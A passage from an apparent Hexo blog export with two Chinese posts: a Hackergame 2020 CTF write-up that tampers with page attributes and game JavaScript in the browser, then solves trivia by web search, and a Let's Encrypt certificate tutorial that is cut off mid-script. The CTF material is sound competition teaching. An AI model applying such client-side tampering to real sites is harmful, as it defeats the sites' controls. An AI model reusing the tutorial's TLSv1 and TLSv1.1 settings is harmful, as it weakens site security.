软件自由日中国科大站](https://lug.ustc.edu.cn/news/2019/09/2019-sfd-ustc/)，进取直接找，文章末尾有\n\n>最后一项是李文睿同学介绍了开源游戏 Teeworlds，由于底层代码开源，开发者可以做出自己的定制，可玩性非常高。\n\n​\t答案就是`Teeworlds`\n\n​\t我还摸到了他们当天活动的记录资料：[点我](https://ftp.lug.ustc.edu.cn/%E6%B4%BB%E5%8A%A8/2019.09.21_SFD/)\n\n​\t在`slides\\闪电演讲\\Teeworlds`文件夹下有应该作者演讲的PPT和游戏的视频演示，有点心动了🤣\n\n**参考答案：9**\n\n\n\n#### 第四题\n\n> 4. 中国科学技术大学西校区图书馆正前方（西南方向） 50 米 L 型灌木处共有几个连通的划线停车位？\n\n​\t直接百度地图搜图书馆，然后全景地图房门口，视野拉到L型灌木那。\n\n![](https://s1.ax1x.com/2020/11/01/BwvkdA.png)\n\n**参考答案：9**\n\n\n\n#### 第五题\n\n> 5. 中国科学技术大学第六届信息安全大赛所有人合计提交了多少次 flag？\n\n​\t百度`中国科学技术大学第六届信息安全大赛`有个`...圆满结束`，就他了。点开第二行就是`经统计，在本次比赛中，总共有 2682 人注册，1904 人至少完成了一题。比赛期间所有人合计提交了 17098 次 flag`。（看这个网站的标志似乎还是第三题搜的那个`USTC Linux 用户协会`的官网新闻。嗷原来题目上已经说了是举办方👀）\n\n**参考答案：17098**\n\n完工。","source":"_posts/Hackgame20201.md","raw":"---\ntitle: Hackgame2020(一)\ncategories:\n- CTF\ntags:\n- Web\n- Hackergame 2020\n- 代码审计\ndate: 2020-11-01 18:33:40\ncover: https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/cover/20201111120831.png\n---\n\n## 前言\n\n比赛地址：https://hack.lug.ustc.edu.cn/\n\n# web\n\n### 签到题\n\n​\t第一题是flag提取器，打开题目以后页面是一个提取器下面一个`进度条`和一个`提取`按钮。\n\n![BwJbJs.png](https://s1.ax1x.com/2020/11/01/BwJbJs.png)\n\n​\t随便拉了拉进度条发现初始是`0`末尾是`1.5`，然后中间的数值都是小数\n\n![BwYAQx.png](https://s1.ax1x.com/2020/11/01/BwYAQx.png)\n\n​\t我猜的题目可能是想让数值为`1`时能提取到flag。\n\n​\tF12查看源代码，定位到进度条的标签，查看属性\n\n![](https://s1.ax1x.com/2020/11/01/BwYoX6.png)\n\n​\t确实和猜测一样最大最小值分别是`0`、`1.5`，注意到`step`值为`0.00001`，就是这个属性让我们拖动进度条时，递增的值是小数，想精准得到`1`个flag，就把网页上的`step`值改为`1`。然后随便拖动一下进度条得到`1`，点击`提取`按钮，完工。\n\n![](https://s1.ax1x.com/2020/11/01/BwNVaD.png)\n\n\n\n### 2048\n\n​\t打开题目是一个`2048`的小游戏，第一个想法就是玩`2048`达到一定分数以后会获得flag（~~可恶这个比赛怎么知道最近我天天在玩2048的~~）,但是想比赛不可能让选手在线玩游戏吧，尤其对于我这种~~逃课废物~~是不可能努力哒！\n\nF12开始翻网页资源\n\n![](https://s1.ax1x.com/2020/11/01/BwUONF.png)\n\n​\t还好上次~~摸鱼~~课题做了一个网页版的2048，略微能看懂一点点结构，第一个`animframe_polyfill`应该就是管动画效果的，`keynpard...`这个肯定是相应按键的，`local_storage_manager`应该是保存游戏的，`game_manager`感觉就是管理整个游戏的主要文件。\n\n​\t打开`game_manager`粗略的看了下变量，`score` 分数、`over、won、keepPlaying`游戏状态，想赢游戏肯定是和`score、won`有关，直接Ctrl+F搜索整个文档这两个变量出现的位置。\n\n发现了\n\n![](https://s1.ax1x.com/2020/11/01/BwdGdK.png)\n\n\n\n​\t只有这里修改了`won`的状态，前面还有个`16384`这个应该就是获得胜利需要得到的分数，这个分数对于我来说还是简简单单（~~小声bb~~[截图为证](https://s1.ax1x.com/2020/11/01/BwUdte.jpg)），直接让`if`里面的语句为真就可以获胜，直接修改`if(1) self.won = true`，保存文件，按一个方向键让语句执行到，完工。\n\n![](https://s1.ax1x.com/2020/11/01/BwwpTK.png)\n\n# general\n\n### 猫咪问题++\n\n​\t秉着前面题都是简单题，试着做了一下，看到题目提示的有往年的问题题解\n\n![](https://s1.ax1x.com/2020/11/01/BwLtDs.png)\n\n​\t题意思很明显的书考验同学的搜题技巧。那就开工。\n\n![](https://s1.ax1x.com/2020/11/01/BwLD8U.png)\n\n\n\n#### 第一题\n\n> 1. 以下编程语言、软件或组织对应标志是哺乳动物的有几个？\n>\n> Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce.\n>\n> 提示：学术上一般认为龙不属于哺乳动物。\n\n​\t本人只认识几个，那就一个一个搜呗。我的模式是：百度`xxx标志`然后第二条就是百度图片的搜索结果，大致辨别一下，然后再百度`xxx是哺乳动物吗`，妥妥的~~胎儿~~教学。\n\n​\t一个比较有印象就是`FreeDOS`这个标志就离谱，什么玩意\n\n![](https://src.onlinedown.net/supply/sup_logo/logo-1122/46778_g.jpg)\n\n\n\n**参考答案 ：12** \n\n\n\n#### 第二题\n\n>2. 第一个以信鸽为载体的 IP 网络标准的 RFC 文档中推荐使用的 MTU (Maximum Transmission Unit) 是多少毫克？\n\n​\t卡了我好一会，没听过信鸽传输，贴上最后找到答案的[博客](https://blog.csdn.net/qq_31621387/article/details/77690642)，以及一篇信鸽传输的[历史发展](sohu.com/a/309403082_354973)，长见识了。\n\n**参考答案：256**\n\n\n\n#### 第三题\n\n>3. USTC Linux 用户协会在 2019 年 9 月 21 日自由软件日活动中介绍的开源游戏的名称共有几个字母？\n>\n>   提示：活动记录会在哪里？\n\n​\t搜索`USTC Linux 用户协会`发现这个协会就是科大爱好者们创建的。那么直接摸到他们官网的[新闻版块](https://lug.ustc.edu.cn/news/)（百度搜出来的是旧站，里面有新站的网址）。题目中还写道`2019年9月21日自由软件日活动`，那么官网肯定有那天的新闻。\n\n​\t找到一篇当天的新闻[2019 软件自由日中国科大站](https://lug.ustc.edu.cn/news/2019/09/2019-sfd-ustc/)，进取直接找，文章末尾有\n\n>最后一项是李文睿同学介绍了开源游戏 Teeworlds，由于底层代码开源，开发者可以做出自己的定制，可玩性非常高。\n\n​\t答案就是`Teeworlds`\n\n​\t我还摸到了他们当天活动的记录资料：[点我](https://ftp.lug.ustc.edu.cn/%E6%B4%BB%E5%8A%A8/2019.09.21_SFD/)\n\n​\t在`slides\\闪电演讲\\Teeworlds`文件夹下有应该作者演讲的PPT和游戏的视频演示，有点心动了🤣\n\n**参考答案：9**\n\n\n\n#### 第四题\n\n> 4. 中国科学技术大学西校区图书馆正前方（西南方向） 50 米 L 型灌木处共有几个连通的划线停车位？\n\n​\t直接百度地图搜图书馆，然后全景地图房门口，视野拉到L型灌木那。\n\n![](https://s1.ax1x.com/2020/11/01/BwvkdA.png)\n\n**参考答案：9**\n\n\n\n#### 第五题\n\n> 5. 中国科学技术大学第六届信息安全大赛所有人合计提交了多少次 flag？\n\n​\t百度`中国科学技术大学第六届信息安全大赛`有个`...圆满结束`，就他了。点开第二行就是`经统计，在本次比赛中，总共有 2682 人注册，1904 人至少完成了一题。比赛期间所有人合计提交了 17098 次 flag`。（看这个网站的标志似乎还是第三题搜的那个`USTC Linux 用户协会`的官网新闻。嗷原来题目上已经说了是举办方👀）\n\n**参考答案：17098**\n\n完工。","slug":"Hackgame20201","published":1,"updated":"2021-12-30T09:42:54.177Z","_id":"ckrr3f9an0007hotca2fyh2fq","comments":1,"layout":"post","photos":[],"link":"","content":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>比赛地址：<a href=\"https://hack.lug.ustc.edu.cn/\">https://hack.lug.ustc.edu.cn/</a></p>\n<h1 id=\"web\"><a href=\"#web\" class=\"headerlink\" title=\"web\"></a>web</h1><h3 id=\"签到题\"><a href=\"#签到题\" class=\"headerlink\" title=\"签到题\"></a>签到题</h3><p>​    第一题是flag提取器，打开题目以后页面是一个提取器下面一个<code>进度条</code>和一个<code>提取</code>按钮。</p>\n<p><img src=\"https://s1.ax1x.com/2020/11/01/BwJbJs.png\" alt=\"BwJbJs.png\"></p>\n<p>​    随便拉了拉进度条发现初始是<code>0</code>末尾是<code>1.5</code>，然后中间的数值都是小数</p>\n<p><img src=\"https://s1.ax1x.com/2020/11/01/BwYAQx.png\" alt=\"BwYAQx.png\"></p>\n<p>​    我猜的题目可能是想让数值为<code>1</code>时能提取到flag。</p>\n<p>​    F12查看源代码，定位到进度条的标签，查看属性</p>\n<p><img src=\"https://s1.ax1x.com/2020/11/01/BwYoX6.png\"></p>\n<p>​    确实和猜测一样最大最小值分别是<code>0</code>、<code>1.5</code>，注意到<code>step</code>值为<code>0.00001</code>，就是这个属性让我们拖动进度条时，递增的值是小数，想精准得到<code>1</code>个flag，就把网页上的<code>step</code>值改为<code>1</code>。然后随便拖动一下进度条得到<code>1</code>，点击<code>提取</code>按钮，完工。</p>\n<p><img src=\"https://s1.ax1x.com/2020/11/01/BwNVaD.png\"></p>\n<h3 id=\"2048\"><a href=\"#2048\" class=\"headerlink\" title=\"2048\"></a>2048</h3><p>​    打开题目是一个<code>2048</code>的小游戏，第一个想法就是玩<code>2048</code>达到一定分数以后会获得flag（<del>可恶这个比赛怎么知道最近我天天在玩2048的</del>）,但是想比赛不可能让选手在线玩游戏吧，尤其对于我这种<del>逃课废物</del>是不可能努力哒！</p>\n<p>F12开始翻网页资源</p>\n<p><img src=\"https://s1.ax1x.com/2020/11/01/BwUONF.png\"></p>\n<p>​    还好上次<del>摸鱼</del>课题做了一个网页版的2048，略微能看懂一点点结构，第一个<code>animframe_polyfill</code>应该就是管动画效果的，<code>keynpard...</code>这个肯定是相应按键的，<code>local_storage_manager</code>应该是保存游戏的，<code>game_manager</code>感觉就是管理整个游戏的主要文件。</p>\n<p>​    打开<code>game_manager</code>粗略的看了下变量，<code>score</code> 分数、<code>over、won、keepPlaying</code>游戏状态，想赢游戏肯定是和<code>score、won</code>有关，直接Ctrl+F搜索整个文档这两个变量出现的位置。</p>\n<p>发现了</p>\n<p><img src=\"https://s1.ax1x.com/2020/11/01/BwdGdK.png\"></p>\n<p>​    只有这里修改了<code>won</code>的状态，前面还有个<code>16384</code>这个应该就是获得胜利需要得到的分数，这个分数对于我来说还是简简单单（<del>小声bb</del><a href=\"https://s1.ax1x.com/2020/11/01/BwUdte.jpg\">截图为证</a>），直接让<code>if</code>里面的语句为真就可以获胜，直接修改<code>if(1) self.won = true</code>，保存文件，按一个方向键让语句执行到，完工。</p>\n<p><img src=\"https://s1.ax1x.com/2020/11/01/BwwpTK.png\"></p>\n<h1 id=\"general\"><a href=\"#general\" class=\"headerlink\" title=\"general\"></a>general</h1><h3 id=\"猫咪问题\"><a href=\"#猫咪问题\" class=\"headerlink\" title=\"猫咪问题++\"></a>猫咪问题++</h3><p>​    秉着前面题都是简单题，试着做了一下，看到题目提示的有往年的问题题解</p>\n<p><img src=\"https://s1.ax1x.com/2020/11/01/BwLtDs.png\"></p>\n<p>​    题意思很明显的书考验同学的搜题技巧。那就开工。</p>\n<p><img src=\"https://s1.ax1x.com/2020/11/01/BwLD8U.png\"></p>\n<h4 id=\"第一题\"><a href=\"#第一题\" class=\"headerlink\" title=\"第一题\"></a>第一题</h4><blockquote>\n<ol>\n<li>以下编程语言、软件或组织对应标志是哺乳动物的有几个？</li>\n</ol>\n<p>Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce.</p>\n<p>提示：学术上一般认为龙不属于哺乳动物。</p>\n</blockquote>\n<p>​    本人只认识几个，那就一个一个搜呗。我的模式是：百度<code>xxx标志</code>然后第二条就是百度图片的搜索结果，大致辨别一下，然后再百度<code>xxx是哺乳动物吗</code>，妥妥的<del>胎儿</del>教学。</p>\n<p>​    一个比较有印象就是<code>FreeDOS</code>这个标志就离谱，什么玩意</p>\n<p><img src=\"https://src.onlinedown.net/supply/sup_logo/logo-1122/46778_g.jpg\"></p>\n<p><strong>参考答案 ：12</strong> </p>\n<h4 id=\"第二题\"><a href=\"#第二题\" class=\"headerlink\" title=\"第二题\"></a>第二题</h4><blockquote>\n<ol start=\"2\">\n<li>第一个以信鸽为载体的 IP 网络标准的 RFC 文档中推荐使用的 MTU (Maximum Transmission Unit) 是多少毫克？</li>\n</ol>\n</blockquote>\n<p>​    卡了我好一会，没听过信鸽传输，贴上最后找到答案的<a href=\"https://blog.csdn.net/qq_31621387/article/details/77690642\">博客</a>，以及一篇信鸽传输的<a href=\"sohu.com/a/309403082_354973\">历史发展</a>，长见识了。</p>\n<p><strong>参考答案：256</strong></p>\n<h4 id=\"第三题\"><a href=\"#第三题\" class=\"headerlink\" title=\"第三题\"></a>第三题</h4><blockquote>\n<ol start=\"3\">\n<li>USTC Linux 用户协会在 2019 年 9 月 21 日自由软件日活动中介绍的开源游戏的名称共有几个字母？</li>\n</ol>\n<p>  提示：活动记录会在哪里？</p>\n</blockquote>\n<p>​    搜索<code>USTC Linux 用户协会</code>发现这个协会就是科大爱好者们创建的。那么直接摸到他们官网的<a href=\"https://lug.ustc.edu.cn/news/\">新闻版块</a>（百度搜出来的是旧站，里面有新站的网址）。题目中还写道<code>2019年9月21日自由软件日活动</code>，那么官网肯定有那天的新闻。</p>\n<p>​    找到一篇当天的新闻<a href=\"https://lug.ustc.edu.cn/news/2019/09/2019-sfd-ustc/\">2019 软件自由日中国科大站</a>，进取直接找，文章末尾有</p>\n<blockquote>\n<p>最后一项是李文睿同学介绍了开源游戏 Teeworlds，由于底层代码开源，开发者可以做出自己的定制，可玩性非常高。</p>\n</blockquote>\n<p>​    答案就是<code>Teeworlds</code></p>\n<p>​    我还摸到了他们当天活动的记录资料：<a href=\"https://ftp.lug.ustc.edu.cn/%E6%B4%BB%E5%8A%A8/2019.09.21_SFD/\">点我</a></p>\n<p>​    在<code>slides\\闪电演讲\\Teeworlds</code>文件夹下有应该作者演讲的PPT和游戏的视频演示，有点心动了🤣</p>\n<p><strong>参考答案：9</strong></p>\n<h4 id=\"第四题\"><a href=\"#第四题\" class=\"headerlink\" title=\"第四题\"></a>第四题</h4><blockquote>\n<ol start=\"4\">\n<li>中国科学技术大学西校区图书馆正前方（西南方向） 50 米 L 型灌木处共有几个连通的划线停车位？</li>\n</ol>\n</blockquote>\n<p>​    直接百度地图搜图书馆，然后全景地图房门口，视野拉到L型灌木那。</p>\n<p><img src=\"https://s1.ax1x.com/2020/11/01/BwvkdA.png\"></p>\n<p><strong>参考答案：9</strong></p>\n<h4 id=\"第五题\"><a href=\"#第五题\" class=\"headerlink\" title=\"第五题\"></a>第五题</h4><blockquote>\n<ol start=\"5\">\n<li>中国科学技术大学第六届信息安全大赛所有人合计提交了多少次 flag？</li>\n</ol>\n</blockquote>\n<p>​    百度<code>中国科学技术大学第六届信息安全大赛</code>有个<code>...圆满结束</code>，就他了。点开第二行就是<code>经统计，在本次比赛中，总共有 2682 人注册，1904 人至少完成了一题。比赛期间所有人合计提交了 17098 次 flag</code>。（看这个网站的标志似乎还是第三题搜的那个<code>USTC Linux 用户协会</code>的官网新闻。嗷原来题目上已经说了是举办方👀）</p>\n<p><strong>参考答案：17098</strong></p>\n<p>完工。</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>比赛地址：<a href=\"https://hack.lug.ustc.edu.cn/\">https://hack.lug.ustc.edu.cn/</a></p>\n<h1 id=\"web\"><a href=\"#web\" class=\"headerlink\" title=\"web\"></a>web</h1><h3 id=\"签到题\"><a href=\"#签到题\" class=\"headerlink\" title=\"签到题\"></a>签到题</h3><p>​    第一题是flag提取器，打开题目以后页面是一个提取器下面一个<code>进度条</code>和一个<code>提取</code>按钮。</p>\n<p><img src=\"https://s1.ax1x.com/2020/11/01/BwJbJs.png\" alt=\"BwJbJs.png\"></p>\n<p>​    随便拉了拉进度条发现初始是<code>0</code>末尾是<code>1.5</code>，然后中间的数值都是小数</p>\n<p><img src=\"https://s1.ax1x.com/2020/11/01/BwYAQx.png\" alt=\"BwYAQx.png\"></p>\n<p>​    我猜的题目可能是想让数值为<code>1</code>时能提取到flag。</p>\n<p>​    F12查看源代码，定位到进度条的标签，查看属性</p>\n<p><img src=\"https://s1.ax1x.com/2020/11/01/BwYoX6.png\"></p>\n<p>​    确实和猜测一样最大最小值分别是<code>0</code>、<code>1.5</code>，注意到<code>step</code>值为<code>0.00001</code>，就是这个属性让我们拖动进度条时，递增的值是小数，想精准得到<code>1</code>个flag，就把网页上的<code>step</code>值改为<code>1</code>。然后随便拖动一下进度条得到<code>1</code>，点击<code>提取</code>按钮，完工。</p>\n<p><img src=\"https://s1.ax1x.com/2020/11/01/BwNVaD.png\"></p>\n<h3 id=\"2048\"><a href=\"#2048\" class=\"headerlink\" title=\"2048\"></a>2048</h3><p>​    打开题目是一个<code>2048</code>的小游戏，第一个想法就是玩<code>2048</code>达到一定分数以后会获得flag（<del>可恶这个比赛怎么知道最近我天天在玩2048的</del>）,但是想比赛不可能让选手在线玩游戏吧，尤其对于我这种<del>逃课废物</del>是不可能努力哒！</p>\n<p>F12开始翻网页资源</p>\n<p><img src=\"https://s1.ax1x.com/2020/11/01/BwUONF.png\"></p>\n<p>​    还好上次<del>摸鱼</del>课题做了一个网页版的2048，略微能看懂一点点结构，第一个<code>animframe_polyfill</code>应该就是管动画效果的，<code>keynpard...</code>这个肯定是相应按键的，<code>local_storage_manager</code>应该是保存游戏的，<code>game_manager</code>感觉就是管理整个游戏的主要文件。</p>\n<p>​    打开<code>game_manager</code>粗略的看了下变量，<code>score</code> 分数、<code>over、won、keepPlaying</code>游戏状态，想赢游戏肯定是和<code>score、won</code>有关，直接Ctrl+F搜索整个文档这两个变量出现的位置。</p>\n<p>发现了</p>\n<p><img src=\"https://s1.ax1x.com/2020/11/01/BwdGdK.png\"></p>\n<p>​    只有这里修改了<code>won</code>的状态，前面还有个<code>16384</code>这个应该就是获得胜利需要得到的分数，这个分数对于我来说还是简简单单（<del>小声bb</del><a href=\"https://s1.ax1x.com/2020/11/01/BwUdte.jpg\">截图为证</a>），直接让<code>if</code>里面的语句为真就可以获胜，直接修改<code>if(1) self.won = true</code>，保存文件，按一个方向键让语句执行到，完工。</p>\n<p><img src=\"https://s1.ax1x.com/2020/11/01/BwwpTK.png\"></p>\n<h1 id=\"general\"><a href=\"#general\" class=\"headerlink\" title=\"general\"></a>general</h1><h3 id=\"猫咪问题\"><a href=\"#猫咪问题\" class=\"headerlink\" title=\"猫咪问题++\"></a>猫咪问题++</h3><p>​    秉着前面题都是简单题，试着做了一下，看到题目提示的有往年的问题题解</p>\n<p><img src=\"https://s1.ax1x.com/2020/11/01/BwLtDs.png\"></p>\n<p>​    题意思很明显的书考验同学的搜题技巧。那就开工。</p>\n<p><img src=\"https://s1.ax1x.com/2020/11/01/BwLD8U.png\"></p>\n<h4 id=\"第一题\"><a href=\"#第一题\" class=\"headerlink\" title=\"第一题\"></a>第一题</h4><blockquote>\n<ol>\n<li>以下编程语言、软件或组织对应标志是哺乳动物的有几个？</li>\n</ol>\n<p>Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce.</p>\n<p>提示：学术上一般认为龙不属于哺乳动物。</p>\n</blockquote>\n<p>​    本人只认识几个，那就一个一个搜呗。我的模式是：百度<code>xxx标志</code>然后第二条就是百度图片的搜索结果，大致辨别一下，然后再百度<code>xxx是哺乳动物吗</code>，妥妥的<del>胎儿</del>教学。</p>\n<p>​    一个比较有印象就是<code>FreeDOS</code>这个标志就离谱，什么玩意</p>\n<p><img src=\"https://src.onlinedown.net/supply/sup_logo/logo-1122/46778_g.jpg\"></p>\n<p><strong>参考答案 ：12</strong> </p>\n<h4 id=\"第二题\"><a href=\"#第二题\" class=\"headerlink\" title=\"第二题\"></a>第二题</h4><blockquote>\n<ol start=\"2\">\n<li>第一个以信鸽为载体的 IP 网络标准的 RFC 文档中推荐使用的 MTU (Maximum Transmission Unit) 是多少毫克？</li>\n</ol>\n</blockquote>\n<p>​    卡了我好一会，没听过信鸽传输，贴上最后找到答案的<a href=\"https://blog.csdn.net/qq_31621387/article/details/77690642\">博客</a>，以及一篇信鸽传输的<a href=\"sohu.com/a/309403082_354973\">历史发展</a>，长见识了。</p>\n<p><strong>参考答案：256</strong></p>\n<h4 id=\"第三题\"><a href=\"#第三题\" class=\"headerlink\" title=\"第三题\"></a>第三题</h4><blockquote>\n<ol start=\"3\">\n<li>USTC Linux 用户协会在 2019 年 9 月 21 日自由软件日活动中介绍的开源游戏的名称共有几个字母？</li>\n</ol>\n<p>  提示：活动记录会在哪里？</p>\n</blockquote>\n<p>​    搜索<code>USTC Linux 用户协会</code>发现这个协会就是科大爱好者们创建的。那么直接摸到他们官网的<a href=\"https://lug.ustc.edu.cn/news/\">新闻版块</a>（百度搜出来的是旧站，里面有新站的网址）。题目中还写道<code>2019年9月21日自由软件日活动</code>，那么官网肯定有那天的新闻。</p>\n<p>​    找到一篇当天的新闻<a href=\"https://lug.ustc.edu.cn/news/2019/09/2019-sfd-ustc/\">2019 软件自由日中国科大站</a>，进取直接找，文章末尾有</p>\n<blockquote>\n<p>最后一项是李文睿同学介绍了开源游戏 Teeworlds，由于底层代码开源，开发者可以做出自己的定制，可玩性非常高。</p>\n</blockquote>\n<p>​    答案就是<code>Teeworlds</code></p>\n<p>​    我还摸到了他们当天活动的记录资料：<a href=\"https://ftp.lug.ustc.edu.cn/%E6%B4%BB%E5%8A%A8/2019.09.21_SFD/\">点我</a></p>\n<p>​    在<code>slides\\闪电演讲\\Teeworlds</code>文件夹下有应该作者演讲的PPT和游戏的视频演示，有点心动了🤣</p>\n<p><strong>参考答案：9</strong></p>\n<h4 id=\"第四题\"><a href=\"#第四题\" class=\"headerlink\" title=\"第四题\"></a>第四题</h4><blockquote>\n<ol start=\"4\">\n<li>中国科学技术大学西校区图书馆正前方（西南方向） 50 米 L 型灌木处共有几个连通的划线停车位？</li>\n</ol>\n</blockquote>\n<p>​    直接百度地图搜图书馆，然后全景地图房门口，视野拉到L型灌木那。</p>\n<p><img src=\"https://s1.ax1x.com/2020/11/01/BwvkdA.png\"></p>\n<p><strong>参考答案：9</strong></p>\n<h4 id=\"第五题\"><a href=\"#第五题\" class=\"headerlink\" title=\"第五题\"></a>第五题</h4><blockquote>\n<ol start=\"5\">\n<li>中国科学技术大学第六届信息安全大赛所有人合计提交了多少次 flag？</li>\n</ol>\n</blockquote>\n<p>​    百度<code>中国科学技术大学第六届信息安全大赛</code>有个<code>...圆满结束</code>，就他了。点开第二行就是<code>经统计，在本次比赛中，总共有 2682 人注册，1904 人至少完成了一题。比赛期间所有人合计提交了 17098 次 flag</code>。（看这个网站的标志似乎还是第三题搜的那个<code>USTC Linux 用户协会</code>的官网新闻。嗷原来题目上已经说了是举办方👀）</p>\n<p><strong>参考答案：17098</strong></p>\n<p>完工。</p>\n"},{"title":"Let s Encrypt 免费Https证书","date":"2020-09-03T07:30:37.000Z","cover":"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/cover/20201111120852.jpg","_content":"\n参考文章:[Let's Encrypt，免费好用的 HTTPS 证书][Let's Encrypt，免费好用的 HTTPS 证书]\n\n### 先放官网\n\n[Let's Encrypt](https://letsencrypt.org/)\n\n>[Let's Encrypt](https://letsencrypt.org/) 是免费、自动化、开放的证书签发服务, 它得到了 Mozilla、Cisco、Akamai、Electronic Frontier Foundation 和 Chrome 等众多公司和机构的支持，发展十分迅猛\n\n---\n\n#### 所需环境\n\n* 一个 HTTP 服务，以 Nginx 为例\n\n* python\n\n* 两个目录:\n\n  >/site\t网站目录\n  >\n  >/site_site_cert\t保存证书的目录\n\n**证书的颁发有两种方式：**\n\n#### 通过在线生成\n\n通过网址在线生成，需要验证文件\n\n#### 通过程序生成\n\n通过本地 IIS，生成后会自动绑定本地 IIS 站点上的HTTPS 域名。\n\n我使用的是第一种方法：在线生成，原理是：先在你的服务器上传一个密钥，然后Let's Encrypt会对网站进行访问，下载密钥进行验证。\n\n---\n\n### 开工\n\n### 创建账号\n\n首先创建一个目录，我是在根目录下创建文件夹site_cert\n\n```shell\nmkdir /site_cert\n```\n\n这个文件夹用来存放各种临时文件和最后的证书文件。进入这个目录，创建一个RSA私钥，用于Let's Encrypt识别你的身份\n\n```shell\nopenssl genrsa 4096 > account.key\n```\n\n### 创建CSR文件\n\n在这之前，还需要创建域名私钥（一定不要使用上面的账户私钥）\n\n```shell\nopenssl genrsa 4096 > domain.key\n```\n\n我参考的文章提到了两种私钥RSA和ECC，我现在也还不懂什么原理，把两种区别放出来吧\n\n> RSA 私钥：兼容性好\n>\n> ECC 私钥：部分老旧操作系统、浏览器不支持。优点是证书体积小\n\n两个用于身份身份验证的私钥文件创建好，就可以生成CSR（Certificate Signing Request，证书签名请求）文件了，申请时可以把域名带 `www` 和不带 `www` 的两种情况都加进去，一张证书最多可以包含100个域名。\n\n```shell\nopenssl req -new -sha256 -key domain.key -subj \"/\" -reqexts SAN -config <(cat /etc/ssl/openssl.cnf <(printf \"[SAN]\\nsubjectAltName=DNS:yoursite.com,DNS:www.yoursite.com\")) > domain.csr\n```\n\n* 其中DNS的`yoursite.com`和`www.yoursite.com`记得要换成自己的域名\n\n我在这里遇到了问题提示找不到`/etc/ssl/openssl.cnf`文件，在网上找的的[解决办法][linux 使用openssl报找不到/usr/lib/ssl/openssl.cnf的解决办法]是\n\n执行 :\n\n```shell\nopenssl version -a\n```\n\n会输出openssl的信息，其中`OPENSSLDIR`对应的路径就是`openssl.cnf`文件的地址，自行将上面的`cat /etc/ssl/openssl.cnf`,改为自己的路径运行。\n\n### 配置验证服务\n\n前面介绍过了Let's Encrypt验证的原理是在你的服务器上生成一个随机文件，在通过创建CSR时的域名进行访问下载，如果成功表明你对这个域名的拥有权。\n\n创建用于存放网站的目录site以及用于验证文件存放的子目录\n\n```shell\nmkdir -p /site/.well-known/acme-challenge/\n```\n\n然后再Nginx中配置:\n\n```nginx\nserver {\n    server_name www.yoursite.com yoursite.com;\n\n    location ^~ /.well-known/acme-challenge/ {\n        alias /home/xxx/www/challenges/;\n        try_files $uri =404;\n    }\n\n    location / {\n        rewrite ^/(.*)$ https://yoursite.com/$1 permanent;\n    }\n}\n```\n\n* 别忘了改`yoursite`\n\n这个配置会优先查找`/site`目录下的网站，建议保留以后证书认证还可以用到，因为颁发的证书一次可以使用90天。\n\n### 获取网站证书\n\n先下载`acme-tiny`脚本到之前的site_cert目录：\n\n```shell\nwget https://raw.githubusercontent.com/diafygi/acme-tiny/master/acme_tiny.py\n```\n\n指定账户私钥、CSR以及网站上验证文件的目录，执行脚本:\n\n```shell\npython acme_tiny.py --account-key ./account.key --csr ./domain.csr --acme-dir /fakesite/.well-known/acme-challenge/ > ./signed.crt\n```\n\n执行成功的话会在当前目录生成一个`signed.crt`文件，这个文件就是申请好的证书文件。\n\n我在这里出现了错误提示\n\n```\nValueError: Wrote file to /site/.well-known/acme-challenge/blablabla, but couldn't download http://www.yoursite.com/.well-known/acme-challenge/blablabla\n```\n\n大概的意思就是，在网站目录里写入了一个验证文件，但是Let's Encrypt的服务器访问不到你的网站，建议先去看一看Nginx配置是否出错，再有可能是自己的域名无法在国外解析，建议暂时使用国外的DNS解析商。推荐的有：\n\n>[Hurricane Electric Free DNS](https://dns.he.net/)\n>\n>[ZoneEdit](https://www.zoneedit.com/)\n>\n>[CloudFlare](https://www.cloudflare.com/)\n\n这些都是免费的，但是因为我自己的域名后缀为.tk，上面第一个DNS解析商警告因为.tk域名滥用，不给解析。\n\n网站证书到手以后，还要下载 Let's Encrypt 的中间证书。证书链中大部分都是「站点证书 – 中间证书 – 根证书」这样三级。服务端只需要发送前两个证书即可。我们需要把中间证书和网站证书合在一起：\n\n```shell\nwget -O - https://letsencrypt.org/certs/lets-encrypt-x3-cross-signed.pem > intermediate.pem\n\n\ncat signed.crt intermediate.pem > chained.pem\n```\n\n**最终**，在Nginx中添加证书配置，并reload，我的部分配置如下\n\n```nginx\nserver {\n   listen 443 ssl;\n   ssl_certificate       /site_cert/chained.pem;\n   ssl_certificate_key   /site_cert/domain.key;\n   ssl_protocols         TLSv1 TLSv1.1 TLSv1.2;\n   ssl_ciphers           HIGH:!aNULL:!MD5;\n   server_name           braindance.tk;\n   index index.html index.htm;\n   root \n        …………………………\n}\n```\n\n执行\n\n```shell\nnginx -s reload\n```\n\n### 证书自动更新 计划任务\n\n​\t至此我们已经成功的获取到了Https证书，但是获取到的Https证书只有90天的时效，到期的话还需要使用相同的方法进行更新，为了避免某次忘记更新导致网站出现问题，我们可以使用linux中的crond服务为我们自动更新证书。\n\n用 `vi` 在 `/site_cert` 文件夹 创建 计划任务脚本 `renew_cert.sh`\n\n```shell\nvi /site_cert/renew_cert.sh\n```\n\n通过`vi`输入以下内容\n\n```shell\n#!/bin/bash\n\ncd /fakesite_cert/\npython acme_tiny.py --account-key ./account.key --csr ./domain.csr --acme-dir /fakesite/.well-known/acme-challenge/ > ./signed.crt || exit\nwget -O - https://letsencrypt.org/certs/lets-encrypt-x3-cross-signed.pem > intermediate.pem\ncat signed.crt intermediate.pem > chained.pem\nnginx -s 